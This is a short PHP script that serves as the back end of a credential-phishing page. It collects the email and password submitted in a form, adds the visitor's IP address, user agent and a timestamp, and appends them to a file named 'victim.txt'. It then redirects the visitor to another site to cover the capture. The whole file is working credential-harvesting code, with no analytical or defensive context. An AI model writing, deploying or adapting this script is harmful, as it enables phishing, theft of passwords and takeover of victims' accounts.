<?php
// Redirect users to another location after submission
header("Location: https://osissip.osis.online");

// Only handle POST requests
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect email and password from form
    $email = $_POST["email"] ?? "No email provided";
    $password = $_POST["password"] ?? "No password provided";

    // Create log entry
    $timestamp = date("Y-m-d H:i:s");
    $userIP = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $log_entry = "Email: $email, Password: $password, [$timestamp] IP: $userIP, User-Agent: $userAgent\n";

    // Save log entry to a file
    file_put_contents("victim.txt", $log_entry, FILE_APPEND);

}
?>
